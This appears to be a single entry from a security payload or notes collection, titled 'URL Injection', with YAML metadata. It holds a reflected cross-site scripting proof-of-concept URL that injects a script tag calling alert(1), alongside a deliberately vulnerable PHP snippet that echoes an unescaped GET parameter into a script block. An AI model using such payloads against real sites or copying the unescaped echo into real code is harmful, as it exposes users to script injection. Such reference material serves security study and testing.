---
id: b17e0f51-ec97-448f-9faf-2acd5b86cc92
name: URL Injection
type: command
executor: bash
data: "http://localhost/bla.php?test=</script><script>alert(1)</script>\n<html>\n\
  \  <script>\n    <?php echo 'foo=\"text '.$_GET['test'].'\";';`?>\n  </script>\n\
  </html>"
output: null
created_at: '2023-04-06T03:56:42.446633+00:00'
updated_at: '2023-04-10T20:21:48.191302+00:00'
---

# URL Injection

```bash
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```


